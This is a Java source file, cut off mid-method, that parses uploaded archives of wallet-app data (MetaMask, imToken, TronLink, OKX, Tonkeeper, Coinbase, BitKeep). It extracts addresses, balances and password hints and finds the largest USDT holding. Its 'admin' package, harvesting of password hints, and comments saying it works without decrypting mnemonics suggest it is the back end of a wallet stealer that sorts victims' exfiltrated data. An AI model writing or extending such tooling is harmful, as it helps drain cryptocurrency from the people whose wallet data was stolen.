package com.admin.parse;

import java.io.InputStream;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

/**
 * 从钱包包明文缓存读取地址和余额，不依赖助记词是否解开。
 * 对齐 Python wallet_addresses：MetaMask / imToken / TronLink / OKX / Tonkeeper / Coinbase / BitKeep。
 * Global Wallet 只有加密库，只给占位行。
 */
public final class PackageAddressScan {

    public static final Set<String> WALLET_KEYS = Set.of(
            "metamask", "imtoken", "tronlink", "okx", "globalwallet", "tonkeeper", "coinbase", "bitkeep");

    private static final int HOLD_BUDGET = 48 * 1024 * 1024;
    private static final Pattern TON_ADDR = Pattern.compile("(?:EQ|UQ|kQ|0Q)[A-Za-z0-9_-]{46}");
    private static final Pattern ANCHOR = Pattern.compile(
            "mnemonicAnchorEth0[\"']?\\s*[:=]\\s*[\"']?(0x[a-fA-F0-9]{40})", Pattern.CASE_INSENSITIVE);
    private static final Pattern ETH_ADDR = Pattern.compile("0x[a-fA-F0-9]{40}");
    private static final Pattern USDT_IN_TEXT = Pattern.compile("(\\d+(?:\\.\\d+)?)\\s*USDT\\b", Pattern.CASE_INSENSITIVE);

    private static final Map<Integer, String> OKX_CHAIN = Map.of(
            1, "BTC", 2, "LTC", 3, "ETH", 5, "BCH", 60, "TRON", 66, "OKC", 195, "TRON");

    private PackageAddressScan() {
    }

    public static final class FileRef {
        public final String fileName;
        public final Path path;
        public final long size;

        public FileRef(String fileName, Path path, long size) {
            this.fileName = fileName == null ? "" : fileName;
            this.path = path;
            this.size = size;
        }
    }

    public static final class Row {
        public String walletName = "";
        public String walletKey = "";
        public String sourceFile = "";
        public String address = "";
        public String chain = "";
        public String symbol = "";
        public String balance = "";
        public String note = "";
        public String passwordHint = "";

        public Map<String, Object> toMap() {
            Map<String, Object> m = new LinkedHashMap<>();
            m.put("walletName", walletName);
            m.put("walletKey", walletKey);
            m.put("sourceFile", sourceFile);
            m.put("address", address);
            m.put("chain", chain);
            m.put("symbol", symbol);
            m.put("balance", balance);
            m.put("note", note);
            m.put("passwordHint", passwordHint);
            return m;
        }

        public static Row fromMap(Map<String, Object> m) {
            Row r = new Row();
            if (m == null) {
                return r;
            }
            r.walletName = str(m.get("walletName"));
            r.walletKey = str(m.get("walletKey"));
            r.sourceFile = str(m.get("sourceFile"));
            r.address = str(m.get("address"));
            r.chain = str(m.get("chain"));
            r.symbol = str(m.get("symbol"));
            r.balance = str(m.get("balance"));
            r.note = str(m.get("note"));
            r.passwordHint = str(m.get("passwordHint"));
            return r;
        }
    }

    /** 上传文件名 + 大小。包没变就不用再解。 */
    public static String fingerprint(List<FileRef> files) {
        List<String> parts = new ArrayList<>();
        if (files != null) {
            for (FileRef f : files) {
                if (f == null || f.fileName == null || f.fileName.isBlank()) {
                    continue;
                }
                String[] matched = WalletMatcher.matchWallet(f.fileName);
                if (matched == null || !WALLET_KEYS.contains(matched[2])) {
                    continue;
                }
                parts.add(f.fileName.trim() + "|" + f.size);
            }
        }
        parts.sort(String::compareTo);
        try {
            byte[] dig = MessageDigest.getInstance("SHA-256").digest(String.join("\n", parts).getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(dig.length * 2);
            for (byte b : dig) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return String.join("\n", parts);
        }
    }

    public static List<Row> collect(List<FileRef> files) {
        List<Row> out = new ArrayList<>();
        if (files == null || files.isEmpty()) {
            return out;
        }
        Set<String> seenFiles = new LinkedHashSet<>();
        Set<String> seenAddr = new LinkedHashSet<>();
        for (FileRef f : files) {
            String fname = f.fileName == null ? "" : f.fileName.trim();
            if (fname.isEmpty() || !seenFiles.add(fname) || f.path == null || !Files.isRegularFile(f.path)) {
                continue;
            }
            if (f.size == 0) {
                continue;
            }
            String[] matched = WalletMatcher.matchWallet(fname);
            if (matched == null || !WALLET_KEYS.contains(matched[2])) {
                continue;
            }
            try {
                for (Row r : extract(f.path, matched[1], matched[2], fname)) {
                    String addr = r.address == null ? "" : r.address.trim();
                    if (addr.isEmpty()) {
                        continue;
                    }
                    String key = matched[2] + "\n" + addr.toLowerCase(Locale.ROOT);
                    if (!seenAddr.add(key)) {
                        continue;
                    }
                    out.add(r);
                    if (out.size() >= 400) {
                        return out;
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return out;
    }

    public static BigDecimal maxUsdt(List<Row> rows) {
        BigDecimal mx = BigDecimal.ZERO;
        if (rows == null) {
            return mx;
        }
        for (Row r : rows) {
            if (r == null || r.balance == null) {
                continue;
            }
            Matcher m = USDT_IN_TEXT.matcher(r.balance);
            while (m.find()) {
                try {
                    BigDecimal v = new BigDecimal(m.group(1));
                    if (v.compareTo(mx) > 0) {
                        mx = v;
                    }
                } catch (Exception ignored) {
                }
            }
        }
        return mx;
    }

    private static List<Row> extract(Path archive, String walletName, String walletKey, String source) {
        Bag bag = new Bag();
        ArchiveIO.walk(archive, null, (name, in, size) -> bag.take(name, in, size), 0);
        List<Row> rows = new ArrayList<>();
        switch (walletKey) {
            case "metamask":
                rows.addAll(metamask(bag, walletName, source));
                break;
            case "imtoken":
                rows.addAll(imtoken(bag, walletName, source));
                break;
            case "tronlink":
                rows.addAll(tronlink(bag, walletName, source));
                break;
            case "okx":
                rows.addAll(okx(bag, walletName, source));
                break;
            case "globalwallet":
                if (bag.global) {
                    rows.add(row(walletName, "globalwallet", source, "—", "—", "—", "—",
                            "地址在加密库中，需解锁后查看", ""));
                }
                break;
            case "tonkeeper":
                rows.addAll(tonkeeper(bag, walletName, source));
                break;
            case "coinbase":
                rows.addAll(coinbase(bag, walletName, source));
                break;
            case "bitkeep":
                rows.addAll(bitkeep(bag, walletName, source));
                break;
            default:
                break;
        }
        return rows;
    }

    private static List<Row> metamask(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        JSONObject accObj = loadJson(bag.accounts);
        if (accObj == null) {
            return rows;
        }
        JSONObject internal = accObj.getJSONObject("internalAccounts");
        JSONObject accounts = internal == null ? null : internal.getJSONObject("accounts");
        if (accounts == null || accounts.isEmpty()) {
            return rows;
        }
        JSONObject assets = loadJson(bag.assets);
        JSONObject assetsBal = assets == null ? null : assets.getJSONObject("assetsBalance");
        JSONObject assetsInfo = assets == null ? null : assets.getJSONObject("assetsInfo");
        JSONObject multiObj = loadJson(bag.multi);
        JSONObject multiBal = multiObj == null ? null : multiObj.getJSONObject("balances");
        for (String aid : accounts.keySet()) {
            JSONObject meta = accounts.getJSONObject(aid);
            if (meta == null) {
                continue;
            }
            String address = str(meta.get("address"));
            if (address.isEmpty()) {
                continue;
            }
            String chainShow = accountTypeChain(str(meta.get("type")));
            String symbol = "";
            List<String> parts = new ArrayList<>();
            JSONObject ab = jsonObj(assetsBal, aid);
            if (ab != null) {
                for (String assetKey : ab.keySet()) {
                    Object info = ab.get(assetKey);
                    Object amt = info instanceof JSONObject ? ((JSONObject) info).get("amount") : null;
                    if (emptyAmt(amt)) {
                        continue;
                    }
                    String[] cs = chainLabelFromCaip(assetKey);
                    JSONObject metaInfo = assetsInfo == null ? null : assetsInfo.getJSONObject(assetKey);
                    Integer dec = metaInfo == null ? null : coerceDecimals(metaInfo.get("decimals"));
                    String sym = cs[1];
                    if (metaInfo != null && sym.isEmpty()) {
                        sym = str(metaInfo.get("symbol"));
                    }
                    String amtText = String.valueOf(amt).trim();
                    String formatted;
                    if (amtText.toLowerCase(Locale.ROOT).startsWith("0x")
                            || (!looksHuman(amtText) && amtText.replace("-", "").matches("\\d+"))) {
                        formatted = fmtAmount(amt, dec != null ? dec : chainDecimals(cs[0], sym));
                    } else {
                        formatted = fmtAmount(amt, null);
                    }
                    if ("0".equals(formatted) && !isZeroText(amtText)) {
                        formatted = fmtAmount(amt, null);
                    }
                    if ("0".equals(formatted) || "—".equals(formatted)) {
                        continue;
                    }
                    parts.add((formatted + " " + sym).trim());
                    if (symbol.isEmpty()) {
                        symbol = sym;
                        chainShow = cs[0];
                    }
                }
            }
            JSONObject mb = jsonObj(multiBal, aid);
            if (mb != null) {
                for (String assetKey : mb.keySet()) {
                    JSONObject info = mb.getJSONObject(assetKey);
                    if (info == null) {
                        continue;
                    }
                    Object amt = info.get("amount");
                    if (emptyAmt(amt)) {
                        continue;
                    }
                    String formatted = fmtAmount(amt, null);
                    if ("0".equals(formatted) || "—".equals(formatted)) {
                        continue;
                    }
                    String unit = str(info.get("unit"));
                    parts.add((formatted + " " + unit).trim());
                    if (symbol.isEmpty()) {
                        symbol = unit;
                    }
                }
            }
            String note = "";
            JSONObject md = meta.getJSONObject("metadata");
            if (md != null) {
                note = str(md.get("name"));
            }
            rows.add(row(walletName, "metamask", source, address, chainShow, symbol.isEmpty() ? "—" : symbol,
                    parts.isEmpty() ? "0" : String.join(" / ", parts), note, ""));
        }
        return rows;
    }

    private static List<Row> imtoken(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        Map<String, String[]> idents = imtokenIdentities(bag);
        for (byte[] raw : bag.async) {
            JSONObject obj = loadJson(raw);
            if (obj == null || !obj.containsKey("AccountModel")) {
                continue;
            }
            JSONObject accounts = items(obj.getJSONObject("AccountModel"));
            JSONObject tokens = items(obj.getJSONObject("AssetToken"));
            Map<String, List<String>> balByAddr = new LinkedHashMap<>();
            if (tokens != null) {
                for (String k : tokens.keySet()) {
                    JSONObject t = tokens.getJSONObject(k);
                    if (t == null) {
                        continue;
                    }
                    String addr = str(t.get("accountAddress"));
                    if (addr.isEmpty()) {
                        continue;
                    }
                    String sym = str(t.get("symbol"));
                    if (sym.isEmpty()) {
                        sym = str(t.get("shortName"));
                    }
                    Integer dec = coerceDecimals(t.get("decimal"));
                    if (dec == null) {
                        dec = coerceDecimals(t.get("precision"));
                    }
                    if (dec == null) {
                        String chain = str(t.get("chainType"));
                        if (chain.isEmpty()) {
                            chain = str(t.get("caip2"));
                        }
                        if (chain.isEmpty()) {
                            chain = str(t.get("chainId"));
                        }
                        dec = chainDecimals(chain, sym);
                    }
                    String bal = fmtAmount(t.get("balance"), dec);
                    if ("—".equals(bal)) {
                        continue;
                    }
                    String rawBal = str(t.get("balance"));
                    if ("0".equals(bal) && !rawBal.isEmpty() && !isZeroText(rawBal)) {
                        continue;
                    }
                    balByAddr.computeIfAbsent(addr.toLowerCase(Locale.ROOT), x -> new ArrayList<>())
                            .add(sym.isEmpty() ? bal : (bal + " " + sym).trim());
                }
            }
            if (accounts != null) {
                for (String accId : accounts.keySet()) {
                    JSONObject acc = accounts.getJSONObject(accId);
                    if (acc == null) {
                        continue;
                    }
                    String address = str(acc.get("address"));
                    if (address.isEmpty() && accId.contains(":")) {
                        String[] parts = accId.split(":");
                        address = parts[parts.length - 1];
                    }
                    if (address.isEmpty()) {
                        continue;
                    }
                    String chain = str(acc.get("chainName"));
                    if (chain.isEmpty()) {
                        chain = str(acc.get("network"));
                    }
                    if (chain.isEmpty() && accId.contains(":")) {
                        chain = caipPrefix(accId.split(":")[0]);
                    }
                    String wid = str(acc.get("walletId"));
                    String[] ident = idents.get(wid);
                    String accName = ident == null ? "" : ident[0];
                    String hint = ident == null ? "" : ident[1];
                    String label = accName.isEmpty() ? walletName : walletName + " · " + accName;
                    List<String> bals = balByAddr.getOrDefault(address.toLowerCase(Locale.ROOT), List.of());
                    rows.add(row(label, "imtoken", source, address, chain.isEmpty() ? "—" : chain, "—",
                            bals.isEmpty() ? "—" : String.join(" / ", bals), "", hint));
                }
            }
            if (!rows.isEmpty()) {
                return rows;
            }
        }
        for (NamedBlob nb : bag.walletsV2) {
            JSONObject obj = loadJson(nb.bytes);
            if (obj == null) {
                continue;
            }
            String fp = str(obj.get("sourceFingerprint"));
            if (fp.isEmpty()) {
                continue;
            }
            String wid = str(obj.get("id"));
            if (wid.isEmpty()) {
                wid = stem(nb.name);
            }
            String[] ident = idents.get(wid);
            JSONObject meta = obj.getJSONObject("imTokenMeta");
            String accName = ident != null && !ident[0].isEmpty() ? ident[0] : (meta == null ? "" : str(meta.get("name")));
            String hint = ident != null && !ident[1].isEmpty() ? ident[1] : (meta == null ? "" : str(meta.get("passwordHint")));
            String label = accName.isEmpty() ? walletName : walletName + " · " + accName;
            rows.add(row(label, "imtoken", source, fp, "ETH", "—", "—", "sourceFingerprint", hint));
        }
        return rows;
    }

    private static Map<String, String[]> imtokenIdentities(Bag bag) {
        Map<String, String[]> byId = new LinkedHashMap<>();
        for (NamedBlob nb : bag.walletsV2) {
            JSONObject obj = loadJson(nb.bytes);
            if (obj == null) {
                continue;
            }
            String wid = str(obj.get("id"));
            if (wid.isEmpty()) {
                wid = stem(nb.name);
            }
            if (wid.isEmpty()) {
                continue;
            }
            JSONObject meta = obj.getJSONObject("imTokenMeta");
            String name = meta == null ? "" : str(meta.get("name"));
            String hint = meta == null ? "" : str(meta.get("passwordHint"));
            byId.put(wid, new String[] {name, hint});
        }
        for (byte[] raw : bag.async) {
            JSONObject obj = loadJson(raw);
            if (obj == null) {
                continue;
            }
            JSONObject wallets = items(obj.getJSONObject("WalletModel"));
            if (wallets == null) {
                continue;
            }
            for (String wid : wallets.keySet()) {
                JSONObject w = wallets.getJSONObject(wid);
                if (w == null) {
                    continue;
                }
                String key = wid.isEmpty() ? str(w.get("id")) : wid;
                if (key.isEmpty()) {
                    continue;
                }
                String name = str(w.get("name"));
                String hint = str(w.get("passwordHint"));
                String[] prev = byId.get(key);
                if (prev == null) {
                    byId.put(key, new String[] {name, hint});
                } else {
                    if (!name.isEmpty()) {
                        prev[0] = name;
                    }
                    if (!hint.isEmpty()) {
                        prev[1] = hint;
                    }
                }
            }
        }
        return byId;
    }

    private static List<Row> tronlink(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        if (bag.tronData == null) {
            return rows;
        }
        List<String[]> wallets = new ArrayList<>();
        Map<String, String> balMap = new LinkedHashMap<>();
        withSqlite(bag.tronData, "tronlink", con -> {
            try (Statement st = con.createStatement();
                    ResultSet rs = st.executeQuery(
                            "SELECT address, walletName, totalCoin, accountEip55String FROM Wallet")) {
                while (rs.next()) {
                    wallets.add(new String[] {
                            str(rs.getString("address")),
                            str(rs.getString("walletName")),
                            str(rs.getString("totalCoin")),
                            str(rs.getString("accountEip55String"))
                    });
                }
            } catch (Exception ignored) {
            }
            try (Statement st = con.createStatement();
                    ResultSet rs = st.executeQuery("SELECT address, balance FROM AccountModelTable")) {
                while (rs.next()) {
                    balMap.put(str(rs.getString("address")), fmtAmount(rs.getString("balance"), 6));
                }
            } catch (Exception ignored) {
            }
        });
        List<String[]> tokenRows = new ArrayList<>();
        if (bag.tronGrdb != null) {
            withSqlite(bag.tronGrdb, "tronlink-grdb", con -> {
                try (Statement st = con.createStatement();
                        ResultSet rs = st.executeQuery(
                                "SELECT currentAddress, shortName, name, balanceStr, balance, precision "
                                        + "FROM ORM_DBTable_HomeNewAsset")) {
                    while (rs.next()) {
                        String addr = str(rs.getString("currentAddress"));
                        if (addr.isEmpty()) {
                            continue;
                        }
                        String sym = str(rs.getString("shortName"));
                        if (sym.isEmpty()) {
                            sym = str(rs.getString("name"));
                        }
                        if (sym.isEmpty()) {
                            sym = "TOKEN";
                        }
                        Integer prec = null;
                        try {
                            prec = coerceDecimals(rs.getObject("precision"));
                        } catch (Exception ignored) {
                        }
                        if (prec == null && ("TRX".equalsIgnoreCase(sym) || "USDT".equalsIgnoreCase(sym)
                                || "USDD".equalsIgnoreCase(sym) || "USDC".equalsIgnoreCase(sym))) {
                            prec = 6;
                        }
                        String balStr = rs.getString("balanceStr");
                        String raw = balStr != null && !balStr.isEmpty() ? balStr : rs.getString("balance");
                        String bal = balStr != null && looksHuman(balStr) ? fmtAmount(balStr, null) : fmtAmount(raw, prec);
                        if ("—".equals(bal) || "0".equals(bal)) {
                            continue;
                        }
                        tokenRows.add(new String[] {addr, sym, bal});
                    }
                } catch (Exception ignored) {
                }
            });
        }
        Map<String, List<String>> tokensByAddr = new LinkedHashMap<>();
        for (String[] t : tokenRows) {
            tokensByAddr.computeIfAbsent(t[0], k -> new ArrayList<>()).add(t[2] + " " + t[1]);
        }
        Set<String> seen = new LinkedHashSet<>();
        for (String[] w : wallets) {
            String address = w[0];
            if (address.isEmpty() || !seen.add(address)) {
                continue;
            }
            String trxBal = balMap.containsKey(address) ? balMap.get(address) : "";
            if (trxBal.isEmpty()) {
                String tt = w[2];
                if (!tt.isEmpty() && looksHuman(tt)) {
                    trxBal = fmtAmount(tt, null);
                } else if (!tt.isEmpty()) {
                    trxBal = fmtAmount(tt, 6);
                } else {
                    trxBal = "—";
                }
            }
            String show = "—".equals(trxBal) ? "0" : trxBal;
            List<String> extras = tokensByAddr.getOrDefault(address, List.of());
            String balShow;
            if (!extras.isEmpty()) {
                List<String> parts = new ArrayList<>();
                parts.add(show + " TRX");
                parts.addAll(extras.subList(0, Math.min(8, extras.size())));
                balShow = String.join(" / ", parts);
            } else {
                balShow = show + " TRX";
            }
            rows.add(row(walletName, "tronlink", source, address, "TRON", "TRX", balShow, w[1], ""));
            String eip = w[3];
            if (eip.startsWith("0x") && seen.add(eip)) {
                rows.add(row(walletName, "tronlink", source, eip, "ETH", "—", "—", w[1], ""));
            }
        }
        return rows;
    }

    private static List<Row> okx(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        if (bag.okxWallet == null) {
            return rows;
        }
        Map<String, List<String>> balByWallet = new LinkedHashMap<>();
        List<String[]> addrs = new ArrayList<>();
        withSqlite(bag.okxWallet, "okx", con -> {
            try (Statement st = con.createStatement();
                    ResultSet rs = st.executeQuery("SELECT walletId, coinId, amount, currencyAmount FROM coin")) {
                while (rs.next()) {
                    String amt = str(rs.getString("amount"));
                    if (amt.isEmpty() || "-1".equals(amt) || "0".equals(amt) || "0.0".equals(amt)) {
                        continue;
                    }
                    String wid = str(rs.getString("walletId"));
                    balByWallet.computeIfAbsent(wid, k -> new ArrayList<>())
                            .add(fmtAmount(amt, null) + " #" + str(rs.getString("coinId")));
                }
            } catch (Exception ignored) {
            }
            try (Statement st = con.createStatement();
                    ResultSet rs = st.executeQuery(
                            "SELECT walletId, chainId, address FROM chain_address ORDER BY chainId")) {
                while (rs.next()) {
                    addrs.add(new String[] {
                            str(rs.getString("walletId")),
                            str(rs.getString("chainId")),
                            str(rs.getString("address"))
                    });
                }
            } catch (Exception ignored) {
            }
        });
        for (String[] a : addrs) {
            if (a[2].isEmpty()) {
                continue;
            }
            int cid = 0;
            try {
                cid = Integer.parseInt(a[1]);
            } catch (Exception ignored) {
            }
            String chain = OKX_CHAIN.getOrDefault(cid, "chain:" + cid);
            List<String> bals = balByWallet.getOrDefault(a[0], List.of());
            String show = bals.isEmpty() ? "—" : String.join(" / ", bals.subList(0, Math.min(6, bals.size())));
            rows.add(row(walletName, "okx", source, a[2], chain, "—", show, "", ""));
            balByWallet.put(a[0], List.of());
        }
        return rows;
    }

    private static List<Row> tonkeeper(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        for (String addr : bag.tonAddrs) {
            String bal = bag.tonBal.getOrDefault(addr, "—");
            rows.add(row(walletName, "tonkeeper", source, addr, "TON", "TON", bal, "包内缓存", ""));
        }
        return rows;
    }

    private static String tonBalance(byte[] raw) {
        JSONObject obj = loadJson(raw);
        if (obj == null) {
            return "—";
        }
        JSONObject bal = obj.getJSONObject("balance");
        if (bal == null) {
            return "—";
        }
        List<String> parts = new ArrayList<>();
        JSONObject ton = bal.getJSONObject("tonBalance");
        if (ton != null && ton.get("amount") != null && !str(ton.get("amount")).isEmpty()) {
            String text = str(ton.get("amount"));
            String tonShow;
            if (looksHuman(text)) {
                tonShow = fmtAmount(text, null) + " TON";
            } else {
                try {
                    long n = Long.parseLong(text);
                    tonShow = (Math.abs(n) >= 1_000_000L ? fmtAmount(n, 9) : fmtAmount(n, null)) + " TON";
                } catch (Exception e) {
                    tonShow = fmtAmount(text, null) + " TON";
                }
            }
            if (!tonShow.startsWith("—")) {
                parts.add(tonShow);
            }
        }
        JSONArray jettons = bal.getJSONArray("jettonsBalance");
        if (jettons != null) {
            int n = Math.min(6, jettons.size());
            for (int i = 0; i < n; i++) {
                JSONObject j = jettons.getJSONObject(i);
                if (j == null) {
                    continue;
                }
                String sym = str(j.get("symbol"));
                if (sym.isEmpty()) {
                    sym = str(j.get("ticker"));
                }
                if (sym.isEmpty()) {
                    sym = "JETTON";
                }
                Object jam = j.get("balance");
                if (jam == null) {
                    jam = j.get("amount");
                }
                if (jam == null) {
                    continue;
                }
                Integer dec = coerceDecimals(j.get("decimals"));
                if (dec == null) {
                    dec = coerceDecimals(j.get("decimal"));
                }
                parts.add(fmtAmount(jam, dec) + " " + sym);
            }
        }
        return parts.isEmpty() ? "—" : String.join(" / ", parts);
    }

    private static List<Row> coinbase(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (byte[] raw : bag.mmkv) {
            if (raw == null || rows.size() >= 8) {
                break;
            }
            Matcher m = ANCHOR.matcher(new String(raw, StandardCharsets.UTF_8));
            while (m.find() && rows.size() < 8) {
                String addr = m.group(1);
                if (seen.add(addr.toLowerCase(Locale.ROOT))) {
                    rows.add(row(walletName, "coinbase", source, addr, "ETH", "ETH", "", "MMKV/缓存", ""));
                }
            }
        }
        return rows;
    }

    private static List<Row> bitkeep(Bag bag, String walletName, String source) {
        List<Row> rows = new ArrayList<>();
        if (bag.bitkeep == null) {
            return rows;
        }
        Set<String> seen = new LinkedHashSet<>();
        withSqlite(bag.bitkeep, "bitkeep", con -> {
            try (Statement st = con.createStatement();
                    ResultSet rs = st.executeQuery("SELECT * FROM my_coins")) {
                ResultSetMetaData md = rs.getMetaData();
                int cols = md.getColumnCount();
                while (rs.next() && rows.size() < 20) {
                    String addr = "";
                    String chain = "ETH";
                    String sym = "ETH";
                    for (int i = 1; i <= cols; i++) {
                        String label = md.getColumnLabel(i);
                        Object v = rs.getObject(i);
                        if (!(v instanceof String)) {
                            continue;
                        }
                        String s = ((String) v).trim();
                        String ll = label == null ? "" : label.toLowerCase(Locale.ROOT);
                        if (addr.isEmpty() && ETH_ADDR.matcher(s).matches()) {
                            addr = s;
                        }
                        if (("chain".equals(ll) || "chainname".equals(ll) || "coin".equals(ll)) && !s.isEmpty()) {
                            chain = s.toUpperCase(Locale.ROOT);
                        }
                        if ((ll.contains("symbol") || "name".equals(ll) || "coinname".equals(ll)) && !s.isEmpty()) {
                            int at = s.indexOf("@@");
                            sym = at > 0 ? s.substring(0, at) : s;
                        }
                    }
                    if (addr.isEmpty() || !seen.add(addr.toLowerCase(Locale.ROOT))) {
                        continue;
                    }
                    rows.add(row(walletName, "bitkeep", source, addr, chain, sym, "", "bitkeep.db", ""));
                }
            } catch (Exception ignored) {
            }
        });
        return rows;
    }

    private static Row row(String walletName, String walletKey, String source, String address, String chain,
            String symbol, String balance, String note, String hint) {
        Row r = new Row();
        r.walletName = walletName == null ? "" : walletName;
        r.walletKey = walletKey;
        r.sourceFile = source;
        r.address = address == null ? "" : address;
        r.chain = chain == null || chain.isEmpty() ? "—" : chain;
        r.symbol = symbol == null || symbol.isEmpty() ? "—" : symbol;
        r.balance = balance == null ? "" : balance;
        r.note = note == null ? "" : note;
        r.passwordHint = hint == null ? "" : hint;
        return r;
    }

    private static JSONObject items(JSONObject model) {
        return model == null ? null : model.getJSONObject("itemsById");
    }

    private static JSONObject jsonObj(JSONObject parent, String key) {
        if (parent == null || key == null) {
            return null;
        }
        JSONObject o = parent.getJSONObject(key);
        return o;
    }

    private static String caipPrefix(String prefix) {
        String p = prefix == null ? "" : prefix.toLowerCase(Locale.ROOT);
        switch (p) {
            case "eip155":
                return "ETH";
            case "tip174":
            case "tron":
                return "TRON";
            case "bip122":
                return "Bitcoin";
            case "ton":
                return "TON";
            case "solana":
                return "Solana";
            case "cosmos":
                return "Cosmos";
            default:
                return prefix == null ? "—" : prefix.toUpperCase(Locale.ROOT);
        }
    }

    private static String accountTypeChain(String atype) {
        String t = atype == null ? "" : atype.toLowerCase(Locale.ROOT);
        if (t.startsWith("eip155")) {
            return "ETH";
        }
        if (t.startsWith("tron")) {
            return "TRON";
        }
        if (t.startsWith("solana")) {
            return "Solana";
        }
        if (t.startsWith("bip122") || t.contains("bitcoin")) {
            return "Bitcoin";
        }
        if (t.startsWith("ton")) {
            return "TON";
        }
        int i = t.indexOf(':');
        if (i > 0) {
            return t.substring(0, i).toUpperCase(Locale.ROOT);
        }
        return atype == null || atype.isEmpty() ? "—" : atype.toUpperCase(Locale.ROOT);
    }

    private static String[] chainLabelFromCaip(String assetKey) {
        String key = assetKey == null ? "" : assetKey.trim();
        if (key.contains("/slip44:60")) {
            String chain = key.split("/")[0];
            return new String[] {caipKnown(chain), "ETH"};
        }
        if (key.contains("/slip44:195") || key.startsWith("tron:")) {
            return new String[] {"TRON", "TRX"};
        }
        if (key.toLowerCase(Locale.ROOT).contains("solana")) {
            return new String[] {"Solana", "SOL"};
        }
        if (key.toLowerCase(Locale.ROOT).contains("bip122") || key.toLowerCase(Locale.ROOT).contains("bitcoin")) {
            return new String[] {"Bitcoin", "BTC"};
        }
        int slash = key.indexOf('/');
        String left = slash > 0 ? key.substring(0, slash) : key;
        return new String[] {caipKnown(left), ""};
    }

    private static String caipKnown(String chain) {
        if (chain == null) {
            return "—";
        }
        switch (chain) {
            case "eip155:1":
                return "ETH";
            case "eip155:56":
                return "BSC";
            case "eip155:137":
                return "Polygon";
            case "eip155:42161":
                return "Arbitrum";
            case "eip155:10":
                return "Optimism";
            case "eip155:8453":
                return "Base";
            case "eip155:59144":
                return "Linea";
            case "tron:0x2b6653dc":
                return "TRON";
            default:
                return chain.isEmpty() ? "—" : chain;
        }
    }

    private static Integer chainDecimals(String chain, String symbol) {
        Integer a = nativeDecimals(symbol);
        if (a != null) {
            return a;
        }
        a = nativeDecimals(chain);
        if (a != null) {
            return a;
        }
        if (chain != null && chain.contains(":")) {
            return nativeDecimals(chain.split(":")[0]);
        }
        return null;
    }

    private static Integer nativeDecimals(String key) {
        if (key == null || key.isBlank()) {
            return null;
        }
        switch (key.trim().toLowerCase(Locale.ROOT)) {
            case "eth":
            case "ethereum":
            case "bsc":
            case "bnb":
            case "polygon":
            case "matic":
            case "arbitrum":
            case "optimism":
            case "base":
            case "linea":
            case "okc":
                return 18;
            case "tron":
            case "trx":
                return 6;
            case "solana":
            case "sol":
                return 9;
            case "btc":
            case "bitcoin":
            case "ltc":
            case "bch":
                return 8;
            case "ton":
                return 9;
            default:
                return null;
        }
    }

    private static Integer coerceDecimals(Object raw) {
        if (raw == null) {
            return null;
        }
        try {
            int d = raw instanceof Number ? ((Number) raw).intValue() : Integer.parseInt(String.valueOf(raw).trim());
            if (d >= 0 && d <= 36) {
                return d;
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static boolean looksHuman(String text) {
        if (text == null) {
            return false;
        }
        String t = text.trim();
        return !t.isEmpty() && !t.toLowerCase(Locale.ROOT).startsWith("0x") && t.indexOf('.') >= 0;
    }

    private static boolean emptyAmt(Object amt) {
        if (amt == null) {
            return true;
        }
        if (amt instanceof Number && ((Number) amt).doubleValue() == 0d) {
            return true;
        }
        String s = String.valueOf(amt).trim();
        return s.isEmpty() || "0".equals(s) || "0.0".equals(s);
    }

    private static boolean isZeroText(String text) {
        if (text == null) {
            return true;
        }
        String t = text.trim();
        return t.isEmpty() || "0".equals(t) || "0.0".equals(t) || "0x0".equalsIgnoreCase(t) || "0x00".equalsIgnoreCase(t);
    }

    static String fmtAmount(Object val, Integer decimals) {
        if (val == null) {
            return "—";
        }
        if (val instanceof Boolean) {
            return "—";
        }
        if (val instanceof Integer || val instanceof Long) {
            BigDecimal n = new BigDecimal(val.toString());
            if (decimals != null) {
                return formatDecimal(n.movePointLeft(decimals));
            }
            return formatDecimal(n);
        }
        if (val instanceof Double || val instanceof Float) {
            double v = ((Number) val).doubleValue();
            if (v == 0d) {
                return "0";
            }
            if (decimals != null && v == Math.rint(v) && Math.abs(v) >= Math.pow(10, Math.max(decimals - 2, 0))) {
                return formatDecimal(BigDecimal.valueOf((long) v).movePointLeft(decimals));
            }
            return formatDecimal(new BigDecimal(String.valueOf(val)));
        }
        String text = String.valueOf(val).trim();
        if (text.isEmpty() || "null".equalsIgnoreCase(text) || "none".equalsIgnoreCase(text)
                || "nil".equalsIgnoreCase(text) || "-1".equals(text)) {
            return "—";
        }
        if (text.toLowerCase(Locale.ROOT).startsWith("0x")) {
            try {
                BigDecimal n = new BigDecimal(new java.math.BigInteger(text.substring(2), 16));
                return decimals != null ? formatDecimal(n.movePointLeft(decimals)) : formatDecimal(n);
            } catch (Exception e) {
                return text;
            }
        }
        if (looksHuman(text)) {
            try {
                return formatDecimal(new BigDecimal(text));
            } catch (Exception e) {
                return text;
            }
        }
        String digits = text.startsWith("-") ? text.substring(1) : text;
        if (digits.matches("\\d+")) {
            BigDecimal n = new BigDecimal(text);
            return decimals != null ? formatDecimal(n.movePointLeft(decimals)) : formatDecimal(n);
        }
        try {
            return formatDecimal(new BigDecimal(text));
        } catch (Exception e) {
            return text;
        }
    }

    private static String formatDecimal(BigDecimal d) {
        if (d == null) {
            return "—";
        }
